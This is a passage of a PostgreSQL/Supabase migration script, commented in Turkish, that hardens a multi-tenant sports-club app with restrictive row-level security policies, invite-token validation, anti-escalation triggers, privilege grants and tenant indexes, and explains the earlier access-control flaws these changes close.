--     Skaler alt sorgu hâlinde planlayıcı InitPlan olarak sorgu başına BİR KEZ
--     hesaplar. Semantik aynı (fonksiyon STABLE).
--
-- Politikalar 43 + 12 = 55 adet. Tek tek yazmak yerine döngüyle üretiliyor:
-- metin birebir aynı olduğu için kopyala-yapıştır hatası riski sıfırlanıyor
-- (0021'in ürettiği şemayla bire bir aynı sonuç).

-- --- ŞABLON-A: tek politika, FOR ALL — profiles + 41 kiracı tablosu + davet.
--     profiles dahil: "yönetici tümünü görür" politikası (12.2) bu restrictive
--     kural olmadan BAŞKA kulüplerin kullanıcılarını da listelerdi.
--     profiles.kulup_id NULL olan platform_admin için NULL = NULL → NULL → satır
--     reddedilir: platform_admin normal API üzerinden hiçbir şey göremez,
--     yalnızca service_role paneliyle çalışır.
do $$
declare t text;
begin
  foreach t in array array[
    'profiles',
    'sube','grup','sporcular','aidat_plani','odeme','antrenman','yoklama',
    'gelisim_degerlendirme','duyuru','etkinlik','konusma','servis_rota','urun',
    'siparis','bireysel_antrenor','bireysel_musaitlik','bireysel_istisna',
    'bireysel_paket','bireysel_rezervasyon','antrenor_grup_ucret','hakedis',
    'basvuru','gider','fatura','kurum_ayarlari','mobil_ozellik','push_token',
    'kurum_brans_secimi','kurum_hizmet_turu_secimi','veli_sporcu',
    'sporcu_antrenor','gelisim_beceri_seviye','duyuru_hedef','etkinlik_katilim',
    'mac_kadro','mac_kadro_sporcu','mesaj','servis_durak','servis_sporcu',
    'siparis_kalem','hakedis_kalem',
    'davet'
  ] loop
    execute format($f$
      create policy "kulup izolasyonu" on public.%I
        as restrictive for all
        using (kulup_id = (select private.current_kulup_id()))
        with check (kulup_id = (select private.current_kulup_id()))
    $f$, t);
  end loop;
end
$$;

-- --- ŞABLON-B: ortak katalog (brans / hizmet_turu / beceri) — DÖRT AYRI POLİTİKA.
--     Tek `for all` politikasına İNDİRİLEMEZ.
--     SEBEP: bu üç tablonun permissive politikası FOR ALL ("yönetici yazar").
--     Restrictive kural tek satırda `for all using (kulup_id is null or ...)`
--     yazılsaydı, DELETE yalnızca USING'e baktığı için HERHANGİ bir kulübün
--     yöneticisi `delete from brans where ad = 'Futbol'` diyerek PLATFORM
--     KATALOĞUNU TÜM KULÜPLER İÇİN silebilirdi. UPDATE'te de aynısı.
--     Bu yüzden OKUMA (NULL'a izin verir) ile YAZMA (yalnızca kendi kulübü)
--     ayrı politikalara bölünmek ZORUNDA.
do $$
declare t text;
begin
  foreach t in array array['brans','hizmet_turu','beceri'] loop
    -- SELECT: platform kataloğu (NULL) + kendi kulübünün satırları
    execute format($f$
      create policy "kulup izolasyonu (okuma)" on public.%I
        as restrictive for select
        using (kulup_id is null or kulup_id = (select private.current_kulup_id()))
    $f$, t);

    -- INSERT: yalnızca kendi kulübüne. Kulüp yöneticisi platform kataloğuna
    -- (kulup_id NULL) satır EKLEYEMEZ.
    execute format($f$
      create policy "kulup izolasyonu (ekleme)" on public.%I
        as restrictive for insert
        with check (kulup_id = (select private.current_kulup_id()))
    $f$, t);

    -- UPDATE: hem kaynak hem hedef satır kendi kulübüne ait olmalı.
    execute format($f$
      create policy "kulup izolasyonu (guncelleme)" on public.%I
        as restrictive for update
        using (kulup_id = (select private.current_kulup_id()))
        with check (kulup_id = (select private.current_kulup_id()))
    $f$, t);

    -- DELETE: yalnızca kendi kulübünün satırı. Platform kataloğu dokunulmaz.
    execute format($f$
      create policy "kulup izolasyonu (silme)" on public.%I
        as restrictive for delete
        using (kulup_id = (select private.current_kulup_id()))
    $f$, t);
  end loop;
end
$$;

-- NOT: `kulup` tablosunda restrictive politika YOK ve gerekmiyor — tek permissive
-- politikası (12.1) zaten `id = current_kulup_id()` diyor, yani kullanıcı yalnızca
-- kendi kulübünün satırını görür. Yazma politikası olmadığı için ekleme/güncelleme
-- yalnızca service_role'e (BYPASSRLS) açıktır.


-- ===========================================================================
-- 13) FONKSİYONLAR, TRIGGER'LAR, GRANT / REVOKE
--     Kaynak: 0016 (fonksiyon gövdeleri), 0017 (search_path sertleştirmesi),
--             0002/0005/0020 (revoke/grant), 0020 (push_token_devral),
--             0021 (protect_profile_role'e kulup_id), 0022 (davet_coz,
--             protect_davet_sporcu, handle_new_user'ın nihai hali),
--             0025 (protect_etkinlik_sonuc)
-- ===========================================================================

-- ---------------------------------------------------------------------------
-- 13.1 private.davet_coz — davet token'ını doğrular, kiracı/rol/sporcu döner.
--
-- NEDEN SECURITY DEFINER: kayıt anında henüz OTURUM YOKTUR. auth.uid() NULL →
-- private.current_kulup_id() NULL → 12.13'teki restrictive politika NULL
-- karşılaştırması yüzünden HER satırı reddeder. Bu fonksiyon tablonun sahibi
-- (postgres) olarak koştuğu için RLS'e takılmaz.
--
-- NEDEN private ŞEMASINDA: PostgREST yalnızca public şemayı yayımlar, bu yüzden
-- fonksiyon /rest/v1/rpc/ üzerinden ÇAĞRILAMAZ (0006 deseni). Aksi halde token
-- deneme (enumeration) uç noktası olurdu.
--
-- GEÇERSİZ TOKEN → SIFIR SATIR. Boş satır ile "kullanılmış" / "süresi geçmiş" /
-- "hiç yok" ayrımı BİLİNÇLİ olarak yapılmıyor: ayrım verilseydi fonksiyon geçerli
-- token'ların varlığını sızdıran bir oracle haline gelirdi.
--
-- p_eposta: davet belirli bir e-postaya çıkarıldıysa (davet.eposta dolu) token
-- yalnızca O adresle kayıt olan kişide çalışır. Varsayılanı NULL olduğu için
-- `davet_coz(token)` çağrısı da bu fonksiyona düşer.
create or replace function private.davet_coz(p_token text, p_eposta text default null)
returns table (kulup_id uuid, rol public.app_role, sporcu_id uuid)
language sql
stable
security definer
set search_path = public
as $$
  select d.kulup_id, d.rol, d.sporcu_id
    from public.davet d
   where d.token = p_token
     and d.kullanildi_at is null
     and d.son_kullanma > now()
     -- nullif(btrim(...),'') → panelden boş string kaydedilmiş bir eposta
     -- "kişiye özel davet" sayılmaz, herkese açık davet gibi davranır.
     -- p_eposta NULL geldiğinde karşılaştırma NULL üretir, satır ELENİR:
     -- kişiye özel davet e-posta sunulmadan çözülemez (fail-closed).
     and (
       nullif(btrim(d.eposta), '') is null
       or lower(btrim(d.eposta)) = lower(btrim(p_eposta))
     )
$$;

-- ---------------------------------------------------------------------------
-- 13.2 handle_new_user — auth.users'a kayıt olunca profiles satırı açar.
--
-- SIRA:
--   a) metadata'da davet_token VARSA → tek doğru kaynak odur. davet_coz ile çöz;
--      geçersizse EXCEPTION (fail-closed). Daveti mühürle, profiles satırını
--      davetteki KULÜP ve ROLLE aç, gerekiyorsa veli_sporcu bağını kur.
--   b) Token YOK ve sistemde TEK kulüp var → o kulübe 'veli' olarak bağlan
--      (kurulum/demo kolaylığı; tek kulüplü kurulumda davet zorunlu değil).
--   c) Token YOK ve birden fazla kulüp var → EXCEPTION.
--
-- GÜVENLİK — 0016'NIN ROL YÜKSELTME KORUMASI:
--   Rol hiçbir dalda raw_user_meta_data'dan OKUNMUYOR. Eski hâli
--   coalesce(metadata.role, 'veli') idi; doğrudan /auth/v1/signup çağrısına
--   data:{role:'yonetici'} koyan herkes yönetici hesabı açabiliyordu.
--     · (a) dalında rol DAVET SATIRINDAN gelir. O satırı yalnızca ilgili kulübün
--       yöneticisi oluşturabilir (12.12) ve platform_admin oluşturamaz (davet_rol_check).
--     · (b) dalında rol sabit 'veli'.
--   Metadata'dan okunan TEK alanlar: 'ad' (zararsız) ve 'davet_token'. Token'ın
--   metadata'dan okunması güvenlidir çünkü token KANITIN KENDİSİDİR: 16 rastgele
--   bayt, uydurulan bir değer hiçbir satırla eşleşmez. Bu "istemcinin söylediğine
--   güvenmek" değil "istemcinin sunduğu sırrı doğrulamak"tır.
create or replace function public.handle_new_user()
returns trigger
language plpgsql
security definer
set search_path = public
as $$
declare
  v_token  text;
  v_ad     text;
  v_kulup  uuid;
  v_rol    app_role;
  v_sporcu uuid;
  v_adet   int;
  v_satir  int;
begin
  v_ad    := coalesce(new.raw_user_meta_data ->> 'ad', '');
  -- Boş string gönderilmesi "token yok" ile aynı anlama gelmeli.
  v_token := nullif(btrim(coalesce(new.raw_user_meta_data ->> 'davet_token', '')), '');

  -- --- (a) DAVETLİ KAYIT ------------------------------------------------
  if v_token is not null then
    select c.kulup_id, c.rol, c.sporcu_id
      into v_kulup, v_rol, v_sporcu
      from private.davet_coz(v_token, new.email) c;

    if v_kulup is null then
      raise exception 'Davet linki geçersiz, süresi dolmuş, daha önce kullanılmış veya başka bir e-posta adresine düzenlenmiş.';
    end if;

    -- SIRA ÖNEMLİ: profiles ÖNCE, davet mührü SONRA.
    -- davet.kullanan_id → profiles(id) FK'si var; mühür önce atılsaydı henüz var
    -- olmayan profil satırına referans verilir ve 23503 ile patlardı.
    --
    -- Rol ve kulüp DAVETTEN. profiles.kulup_id "default" hilesini yapısal olarak
    -- kullanamaz (bölüm 2), bu yüzden açıkça yazılıyor.
    insert into public.profiles (id, role, ad, kulup_id)
    values (new.id, v_rol, v_ad, v_kulup);

    -- TEK KULLANIMLIK MÜHÜR — KOŞULLU.
    -- Yarış durumu: aynı linkle eşzamanlı iki kayıt denemesinde ikisi de
    -- davet_coz'dan geçebilir. Bu UPDATE'in `kullanildi_at is null` koşulu
    -- READ COMMITTED'de birinci işlem commit ettikten sonra YENİDEN
    -- değerlendirilir; ikinci işlem 0 satır günceller ve aşağıdaki kontrolle
    -- reddedilir. Exception tüm kayıt işlemini geri alır (trigger, auth.users
    -- INSERT'i ile aynı transaction'dadır) — yetim profil satırı oluşmaz.
    update public.davet
       set kullanildi_at = now(),
           kullanan_id   = new.id
     where token = v_token
       and kullanildi_at is null
       and son_kullanma  > now();

    get diagnostics v_satir = row_count;
    if v_satir <> 1 then
      raise exception 'Davet linki az önce başka bir kayıtta kullanıldı. Kulüp yöneticinizden yeni bir davet isteyin.';
    end if;

    -- Veli daveti belirli bir sporcuya bağlıysa bağı hemen kur; veli ilk girişte
    -- çocuğunu görsün. kulup_id AÇIKÇA yazılıyor: bu fonksiyon service_role/postgres
    -- bağlamında koşar, auth.uid() NULL'dur ve tablonun default'u NULL üretirdi.
    -- Sporcunun aynı kulüpte olduğu protect_davet_sporcu() ile davet oluşturma
    -- anında garanti altındadır.
    if v_sporcu is not null then
      insert into public.veli_sporcu (veli_id, sporcu_id, kulup_id)
      values (new.id, v_sporcu, v_kulup)
      on conflict do nothing;
    end if;

    return new;
  end if;

  -- --- (b) DAVETSİZ KAYIT — KULÜBE BAĞLANMIYOR (0052) -------------------
  -- ⚠ BURASI ESKİDEN "tek kulüp varsa ona bağla" DİYORDU VE AÇIKTI.
  --   Uygulama herkese açık bir adreste; o hâliyle adrese giren HERKES
  --   "Kayıt Ol" deyip kulübün velisi olabiliyordu. Ölçüldü — böyle bir
  --   hesapla okunabilenler:
  --     kurum_ayarlari 1 → IBAN AÇIK · duyuru 1 · etkinlik 1 · grup 7 · urun 6
  --   (sporcular/odeme/yoklama 0 idi, yani çocuk verisi sızmıyordu; ama
  --   kulübün IBAN'ının internete açık olması dolandırıcılık riski.)
  --
  --   Artık kulup_id NULL yazılıyor. private.current_kulup_id() NULL döndüğü
  --   için restrictive kiracı duvarı bu kullanıcı için TÜMÜYLE kapanıyor —
  --   düzeltmeden sonra aynı ölçüm 10 tablonun 10'unda da 0 verdi.
  --
  --   Yan fayda: davranış artık kulüp SAYISINDAN BAĞIMSIZ. Eskiden sistem tek
  --   kulüpken açık, iki kulüpken kapalıydı; güvenliğin müşteri sayısına göre
  --   değişmesi er geç yanlış tarafa düşer.
  --
  --   Sıfır kulüp exception'ı da KALDIRILDI: platform sahibinin hesabı henüz
  --   hiç kulüp yokken açılabilmeli, aksi halde sistem kurulamaz.
  --
  --   Panelde bu kişi doğru mesajı alıyor (dal.ts → 'hesapsiz'):
  --   "Bu hesabın kulüp kaydı bulunamadı… davet bağlantısı isteyin."
  select count(*) into v_adet from public.kulup;

  insert into public.profiles (id, role, ad, kulup_id)
  values (new.id, 'veli', v_ad, null);

  if v_adet > 0 then
    raise notice 'Davetsiz kayıt: % kulübe bağlanmadı (kulup_id NULL). Erişim için davet gerekli.', new.email;
  end if;

  return new;
end;
$$;

create trigger on_auth_user_created
  after insert on auth.users
  for each row execute procedure public.handle_new_user();

-- ---------------------------------------------------------------------------
-- 13.3 protect_profile_role — rol / şube / KULÜP yükseltme koruması.
-- Bilinçli olarak SECURITY INVOKER: current_user isteği yapan gerçek DB rolüdür,
-- yani son kullanıcı (authenticated) kısıtlanır; SQL Editor (postgres) ve
-- service_role (davet akışı) serbest kalır — test için trigger disable etmek gerekmez.
--
-- kulup_id kontrolü 0021'de eklendi: profiles UPDATE politikası (12.2)
-- kullanıcının kendi satırını güncellemesine izin veriyor; kulup_id korunmasaydı
-- bir veli kendi kulup_id'sini değiştirip BAŞKA BİR KULÜBE atlayabilirdi.
create or replace function public.protect_profile_role()
returns trigger
language plpgsql
set search_path = ''
as $$
begin
  if current_user = 'authenticated' then
    if new.role is distinct from old.role then
      raise exception 'role alanı bu şekilde değiştirilemez';
    end if;
    if new.sube_id is distinct from old.sube_id then
      raise exception 'sube_id alanı bu şekilde değiştirilemez';
    end if;
    if new.kulup_id is distinct from old.kulup_id then
      raise exception 'kulup_id alanı bu şekilde değiştirilemez';
    end if;
  end if;
  return new;
end;
$$;

create trigger on_profile_role_protect
  before update on public.profiles
  for each row execute procedure public.protect_profile_role();

-- ---------------------------------------------------------------------------
-- 13.4 protect_davet_sporcu — davetteki sporcu başka kulübün olmasın (0022 bölüm 4).
-- davet.sporcu_id ayağına bileşik FK konulamadığı için (on delete set null,
-- kulup_id NOT NULL) aynı garanti trigger ile sağlanıyor. Hata KAYIT ANINDA
-- anlaşılmaz bir FK mesajı olarak değil, DAVET OLUŞTURMA anında çıkar.
--
-- SECURITY INVOKER: bir yönetici için public.sporcular sorgusu RLS'e tabidir ve
-- yabancı sporcu zaten "bulunamadı" olur; service_role / postgres için RLS baypas
-- edilir ve karşılaştırma gerçek kulup_id üzerinden yapılır. İki yol da doğru.
create or replace function public.protect_davet_sporcu()
returns trigger
language plpgsql
set search_path = ''
as $$
declare
  v_sporcu_kulup uuid;
begin
  if new.sporcu_id is not null then
    select s.kulup_id into v_sporcu_kulup
      from public.sporcular s
     where s.id = new.sporcu_id;

    if v_sporcu_kulup is null or v_sporcu_kulup is distinct from new.kulup_id then
      raise exception 'Davetteki sporcu bu kulübe ait değil.';
    end if;
  end if;
  return new;
end;
$$;

create trigger on_davet_sporcu_protect
  before insert or update on public.davet
  for each row execute procedure public.protect_davet_sporcu();

-- ---------------------------------------------------------------------------
-- 13.5 protect_bireysel_paket — veli, kalan=999 yazıp sınırsız ders hakkı
-- üretemesin diye. Yönetici dışındaki kullanıcılar için tek izinli değişiklik:
-- kalan'ın tam 1 azalması (rezervasyon anındaki düşüm).
-- Not: ileride "antrenör reddetti → ders hakkı iade" akışı eklenirse buraya
-- kontrollü bir kalan+1 istisnası gerekecek.
create or replace function public.protect_bireysel_paket()
returns trigger
language plpgsql
set search_path = ''
as $$
begin
  if current_user = 'authenticated' and coalesce(private.current_profile_role()::text, '') <> 'yonetici' then
    if new.id            is distinct from old.id
       or new.antrenor_id is distinct from old.antrenor_id
       or new.sporcu_id   is distinct from old.sporcu_id
       or new.toplam      is distinct from old.toplam
       or new.tutar       is distinct from old.tutar
       or new.created_at  is distinct from old.created_at
       or new.kalan       is distinct from old.kalan - 1 then
      raise exception 'paket yalnızca 1 ders düşülerek güncellenebilir';
    end if;
  end if;
  return new;
end;
$$;

create trigger on_bireysel_paket_protect
  before update on public.bireysel_paket
  for each row execute procedure public.protect_bireysel_paket();

-- ---------------------------------------------------------------------------
-- 13.6 protect_konusma_taraflar — veli/antrenör, kendi thread'inin karşı tarafını
-- başka bir kullanıcıyla değiştirip istenmeyen mesaj kanalı açamasın diye.
-- Meşru istemci güncellemeleri yalnızca son_mesaj* / *okundu_zaman alanlarıdır.
create or replace function public.protect_konusma_taraflar()
returns trigger
language plpgsql
set search_path = ''
as $$
begin
  if current_user = 'authenticated' then
    if new.veli_id is distinct from old.veli_id
       or new.antrenor_id is distinct from old.antrenor_id then
      raise exception 'konuşmanın tarafları değiştirilemez';
    end if;
  end if;
  return new;
end;
$$;

create trigger on_konusma_taraflar_protect
  before update on public.konusma
  for each row execute procedure public.protect_konusma_taraflar();

-- ---------------------------------------------------------------------------
-- 13.6b mesaj_gonderen_rol_turet — mesajın "kim yazdı" etiketi SUNUCUDA türetilir.
--       Kaynak: 0046.
--
-- NEDEN VAR: `gonderen_rol` 0011'de istemcinin beyanı olarak eklenmişti. RLS
-- mesajı YAZANI doğruluyor (gonderen_id = auth.uid() + konuşmanın tarafı olmak)
-- ama NE SIFATLA yazdığına bakmıyordu. Yerelde ölçüldü: bir veli kendi
-- konuşmasına `gonderen_rol = 'antrenor'` ile satır yazabiliyordu ve
-- admin-panel/app/(panel)/mesajlar/page.tsx yalnızca bu kolona baktığı için
-- (gonderen_id'yi hiç seçmiyor) mesaj yöneticinin "Salt izleme" ekranında
-- ANTRENÖRÜN balonunda çiziliyordu. Yani veli, antrenörün ağzından yazışma
-- uydurup şikâyet ekranında (0031) delil olarak sunabilirdi. Ters yön de aynı.
--
-- NEDEN TETİKLEYİCİ: bu bir güvenlik değişmezi, iş kuralı değil — veli,
-- antrenör, yönetici, service_role ve postgres dahil herkese işlemeli. RLS'e
-- konsaydı service_role yolu açık kalırdı.
--
-- YANLIŞ BEYAN SESSİZCE DÜZELTİLİR, EXCEPTION ATILMAZ: meşru istemci zaten
-- doğru değeri gönderiyor; exception, kolonu göndermeyen bir istemci sürümünde
-- mesajlaşmayı tamamen kırardı (0037 dersi).
--
-- veli_id = antrenor_id olan konuşmalarda (aynı hesap iki şapka — kolonun var
-- olma sebebi) türetme ayrım yapamaz, beyan KORUNUR.
create or replace function public.mesaj_gonderen_rol_turet()
returns trigger
language plpgsql
set search_path = ''
as $$
declare
  v_veli     uuid;
  v_antrenor uuid;
begin
  select k.veli_id, k.antrenor_id
    into v_veli, v_antrenor
    from public.konusma k
   where k.id = new.konusma_id;

  if v_veli is null then
    return new;                      -- konuşma yok: FK zaten reddedecek
  end if;

  if v_veli = v_antrenor then
    return new;                      -- belirsiz: beyan korunur
  end if;

  if new.gonderen_id = v_antrenor then
    new.gonderen_rol := 'antrenor';
  elsif new.gonderen_id = v_veli then
    new.gonderen_rol := 'veli';
  else
    raise exception 'mesajı yazan kişi bu konuşmanın tarafı değil'
      using errcode = 'insufficient_privilege';
  end if;

  return new;
end;
$$;

create trigger on_mesaj_gonderen_rol
  before insert or update on public.mesaj
  for each row execute procedure public.mesaj_gonderen_rol_turet();

-- ---------------------------------------------------------------------------
-- 13.7 protect_bireysel_rezervasyon — durum değiştirirken tutar/sporcu/paket de
-- değiştirilip hakediş/ciro şişirilmesin diye kolonları dondurur (yönetici serbest).
create or replace function public.protect_bireysel_rezervasyon()
returns trigger
language plpgsql
set search_path = ''
as $$
begin
  if current_user = 'authenticated' and coalesce(private.current_profile_role()::text, '') <> 'yonetici' then
    if new.id            is distinct from old.id
       or new.antrenor_id is distinct from old.antrenor_id
       or new.sporcu_id   is distinct from old.sporcu_id
       or new.paket_id    is distinct from old.paket_id
       or new.tutar       is distinct from old.tutar
       or new.odeme_tipi  is distinct from old.odeme_tipi
       or new.odeme_notu  is distinct from old.odeme_notu
       or new.tarih       is distinct from old.tarih
       or new.saat        is distinct from old.saat
       or new.sure_dk     is distinct from old.sure_dk
       or new.tesis       is distinct from old.tesis
       or new.created_at  is distinct from old.created_at then
      raise exception 'rezervasyonda yalnızca durum/sonuç alanları güncellenebilir';
    end if;
  end if;
  return new;
end;
$$;

create trigger on_bireysel_rezervasyon_protect
  before update on public.bireysel_rezervasyon
  for each row execute procedure public.protect_bireysel_rezervasyon();

-- ---------------------------------------------------------------------------
-- 13.8 protect_etkinlik_sonuc — 12.7'deki "antrenör maç sonucunu girer"
-- politikasının kolon ayağı (0025): yönetici dışındaki kullanıcı etkinlik
-- satırında YALNIZCA 4 sonuç alanını değiştirebilir.
--
-- KOLONLARI TEK TEK SAYMAK YERİNE to_jsonb FARKI:
--   13.5/13.7 değişmemesi gereken kolonları tek tek sayıyor; orada tablo kapalı
--   bir küme, burada değil — etkinlik'e 0021 kulup_id ekledi, ileride başkaları
--   da eklenebilir. Kolon sayan bir gövde yeni her kolonu SESSİZCE serbest
--   bırakırdı (fail-open). İzinli 4 alanı jsonb'den düşürüp geri kalanı bütün
--   olarak karşılaştırmak fail-closed davranır: yarın eklenen kolon otomatik korunur.
--
-- SONUÇ ↔ SKOR TUTARLILIĞI BİLİNÇLİ OLARAK ZORLANMIYOR: `sonuc` normal akışta
-- skordan türetiliyor (sonucTuret, app/src/data/etkinlikRepo.ts) ama hükmen
-- galibiyet gibi skorla uyuşmayan meşru durumlar var. Değer kümesi zaten
-- etkinlik tablosundaki check constraint ile kapalı.
create or replace function public.protect_etkinlik_sonuc()
returns trigger
language plpgsql
security invoker
set search_path = ''
as $$
begin
  if current_user = 'authenticated'
     and coalesce(private.current_profile_role()::text, '') <> 'yonetici' then
    if to_jsonb(new) - 'skor_biz' - 'skor_rakip' - 'sonuc' - 'sonuc_notu'
       is distinct from
       to_jsonb(old) - 'skor_biz' - 'skor_rakip' - 'sonuc' - 'sonuc_notu' then
      raise exception 'etkinlikte yalnızca maç sonucu alanları güncellenebilir';
    end if;
  end if;
  return new;
end;
$$;

create trigger on_etkinlik_sonuc_protect
  before update on public.etkinlik
  for each row execute procedure public.protect_etkinlik_sonuc();

-- ---------------------------------------------------------------------------
-- 13.9 push_token_devral — cihaz devri. Aynı telefonda A çıkıp B girdiğinde token
-- hâlâ A'nın satırındadır; B'nin insert'i PK çakışmasına, upsert'i RLS reddine
-- takılırdı. Token cihazı temsil eder: INSERT'ten önce aynı token'ın eski satırı
-- SECURITY DEFINER ile silinir.
--
-- ⚠ 0050: SİLME KULÜPLE SINIRLI — eskiden `where token = new.token` idi ve bu
--   SÖMÜRÜLEBİLİR bir açıktı. Fonksiyon SECURITY DEFINER ve sahibi postgres,
--   yani RLS'i ve kiracı duvarını baypas ediyor; silme koşulu ise yalnızca
--   istemcinin gönderdiği token metniydi. Ölçüldü: A kulübünün velisi, B
--   kulübünde kayıtlı bir token metnini kullanarak B'nin satırını sildi
--   (B kulübünde token satırı 1 -> 0). Gerçekçi senaryo: aile A'dan ayrılıp
--   B'ye geçiyor, A'nın yöneticisi ayrılırken gördüğü token'ı saklıyor ve
--   B'deki kaydı istediği sıklıkta siliyor; B'nin velisi antrenman iptali ve
--   maç saati bildirimlerini hiç almıyor.
--
--   Kural TETİKLEYİCİYE yazıldı çünkü bir güvenlik değişmezi: RLS'e konamaz
--   (silmeyi yapan gövde RLS'i baypas ediyor), GRANT'e konamaz (tetikleyici
--   EXECUTE aramıyor).
--
--   BEDELİ: kulüpler arası cihaz devri artık açık bir hatayla reddediliyor.
--   Bugün kırılan bir akış yok (EAS projectId olmadığı için push hiçbir
--   derlemede çalışmıyor); push açılmadan önce cihaz sahipliğini kanıtlayan
--   bir el sıkışma gerekiyor.
create or replace function public.push_token_devral()
returns trigger
language plpgsql
security definer
set search_path = public
as $$
declare
  v_yabanci_kulup uuid;
begin
  -- Aynı kiracı içinde cihaz devri — 0020'nin asıl amacı, korunuyor.
  delete from public.push_token
   where token = new.token
     and kulup_id = new.kulup_id;

  -- Başka kiracıda duruyorsa SİLMİYORUZ; sessiz PK çarpışması da bırakmıyoruz.
  select kulup_id into v_yabanci_kulup
    from public.push_token
   where token = new.token
   limit 1;

  if v_yabanci_kulup is not null then
    raise exception
      'Bu cihaz başka bir kulüpte kayıtlı. Kayıt için önce diğer kulüpteki oturumdan çıkış yapılmalı.'
      using errcode = 'unique_violation',
            hint = 'push_token.token birincil anahtardır ve kulüpler arasında tekildir; '
                   'çapraz kiracı devri 0050 ile bilerek engellenmiştir.';
  end if;

  return new;
end;
$$;

create trigger on_push_token_devral
  before insert on public.push_token
  for each row execute procedure public.push_token_devral();


-- ---------------------------------------------------------------------------
-- 13.10 Grant / revoke
-- ---------------------------------------------------------------------------
-- SIRA KRİTİK: önce toplu GRANT'ler, SONRA hedefli REVOKE'lar. Ters sırada
-- `grant all on all routines` aşağıda kaldırılan EXECUTE haklarını geri verirdi.

-- --- 13.10.1 public şeması toplu izinleri (SAVUNMA AMAÇLI)
-- Gerçek bir Supabase projesinde bu blok GEREKSİZDİR: proje kurulurken tanımlanan
-- `alter default privileges` kuralları, public şemasında yeni yaratılan her
-- tablo/sequence/fonksiyon için anon, authenticated ve service_role'e izinleri
-- OTOMATİK verir. Blok yine de yazılıyor çünkü:
--   · public şeması sıfırlanmış / elle yeniden yaratılmış ortamlarda (yerel
--     Docker kurulumunda `drop schema public cascade` sonrası) default
--     privileges kuralları KAYBOLUR ve tablolar API'ye kapalı doğar. Belirti
--     yanıltıcıdır: RLS doğru kurulmuşken PostgREST "permission denied for
--     table ..." döner ve saatlerce RLS'te hata aranır.
--   · Saf Postgres (Supabase olmayan) bir kurulumda hiç var olmaz.
-- İzinlerin gerçek daraltıcısı GRANT değil RLS'tir: aşağıdaki `grant all` bir
-- satır bile açmaz, 12. bölümdeki politikalar neyi görebileceğine karar verir.
--
-- NOT: pgcrypto `public` şemasına kurulmuş bir ortamda (bkz. bölüm 11) alttaki
-- `grant all on all routines` satırı eklentinin fonksiyonları için
-- "WARNING: no privileges were granted for digest/hmac/..." uyarıları basar.
-- Zararsızdır: o fonksiyonlarda EXECUTE zaten PUBLIC'e verilidir, verilecek yeni
-- bir izin yoktur. Supabase projelerinde pgcrypto `extensions` şemasındadır ve
-- bu uyarılar hiç çıkmaz.
grant usage on schema public to anon, authenticated, service_role;
grant all on all tables    in schema public to anon, authenticated, service_role;
grant all on all sequences in schema public to anon, authenticated, service_role;
grant all on all routines  in schema public to anon, authenticated, service_role;

-- --- 13.10.2 private şeması
-- 0016: private şemasına USAGE. SECURITY INVOKER trigger'lar (13.5, 13.7, 13.8)
-- isim çözümlemesini ÇAĞIRANIN yetkileriyle runtime'da yapar — USAGE olmadan her
-- authenticated UPDATE 'permission denied for schema private' verir.
grant usage on schema private to authenticated, service_role;

-- 0005: current_profile_role() RLS politikalarının içinden çağrıldığı için
-- authenticated'a EXECUTE şart; anon/public'ten kaldırılıyor (girişsiz doğrudan
-- çağrı engellenir). Fonksiyon zaten `private` şemasında olduğu için PostgREST
-- tarafından RPC endpoint'i olarak da yayımlanmaz.
revoke execute on function private.current_profile_role() from public;
revoke execute on function private.current_profile_role() from anon;
grant execute on function private.current_profile_role() to authenticated;

-- 0021: current_kulup_id() için aynı desen.
--   authenticated: 55 restrictive politikanın içinden çağrılıyor, EXECUTE şart.
--   service_role : kulup_id'yi açıkça geçmeyen bir service_role INSERT'ünde kolon
--                  default'u bu fonksiyonu çağırır; EXECUTE olmazsa "permission
--                  denied for function" gibi yanıltıcı bir hata alınır.
revoke execute on function private.current_kulup_id() from public;
revoke execute on function private.current_kulup_id() from anon;
grant execute on function private.current_kulup_id() to authenticated;
grant execute on function private.current_kulup_id() to service_role;

-- 0022: davet_coz yalnızca SECURITY DEFINER olan handle_new_user'dan (yani
-- postgres bağlamında) çağrılıyor; authenticated'a EXECUTE VERİLMİYOR.
revoke execute on function private.davet_coz(text, text) from public;
revoke execute on function private.davet_coz(text, text) from anon;
revoke execute on function private.davet_coz(text, text) from authenticated;
grant  execute on function private.davet_coz(text, text) to service_role;

-- --- 13.10.3 public şemasındaki SECURITY DEFINER fonksiyonların kapatılması
-- 0002 + 0016: handle_new_user() SECURITY DEFINER; yalnızca auth.users insert
-- trigger'ı çağırmalı. Trigger'ın çalışması bu izne bağlı değildir.
revoke execute on function public.handle_new_user() from public;
revoke execute on function public.handle_new_user() from anon;
revoke execute on function public.handle_new_user() from authenticated;

-- 0020: push_token_devral() de SECURITY DEFINER — yalnızca trigger çağırır.
revoke execute on function public.push_token_devral() from public;
revoke execute on function public.push_token_devral() from anon;
revoke execute on function public.push_token_devral() from authenticated;


-- ===========================================================================
-- 14) kulup_id İNDEKSLERİ
--     Kaynak: 0021 bölüm 8, 0022 bölüm 2.3, 0024 bölüm 3, 0025 bölüm 3
-- ===========================================================================
-- 14.1 TEK KOLONLU kulup_id İNDEKSLERİ
-- ---------------------------------------------------------------------------
-- Restrictive politika artık HER sorguya `kulup_id = $1` predicate'i ekliyor;
-- kulup_id indekssiz kalırsa çok kiracılı ortamda her okuma seq scan olur.
-- Bileşik (id, kulup_id) unique index'leri kulup_id ile BAŞLAMADIĞI için
-- filtreleme amacıyla kullanılamaz — ayrı tek kolonlu indeks şart.
-- HARİÇ: kurum_ayarlari ve mobil_ozellik — PK'leri zaten kulup_id ile BAŞLIYOR.
do $$
declare t text;
begin
  foreach t in array array[
    'profiles','brans','hizmet_turu','beceri',
    'sube','grup','sporcular','aidat_plani','odeme','antrenman','yoklama',
    'gelisim_degerlendirme','duyuru','etkinlik','konusma','servis_rota','urun',
    'siparis','bireysel_antrenor','bireysel_musaitlik','bireysel_istisna',
    'bireysel_paket','bireysel_rezervasyon','antrenor_grup_ucret','hakedis',
    'basvuru','gider','fatura','push_token',
    'kurum_brans_secimi','kurum_hizmet_turu_secimi','veli_sporcu',
    'sporcu_antrenor','gelisim_beceri_seviye','duyuru_hedef','etkinlik_katilim',
    'mac_kadro','mac_kadro_sporcu','mesaj','servis_durak','servis_sporcu',
    'siparis_kalem','hakedis_kalem',
    'davet'
  ] loop
    execute format('create index if not exists %I on public.%I (kulup_id)', t || '_kulup_id_idx', t);
  end loop;
end
$$;


-- ---------------------------------------------------------------------------
-- 14.2 BİLEŞİK / KISMİ İNDEKSLER  (0024 + 0025)
-- ---------------------------------------------------------------------------
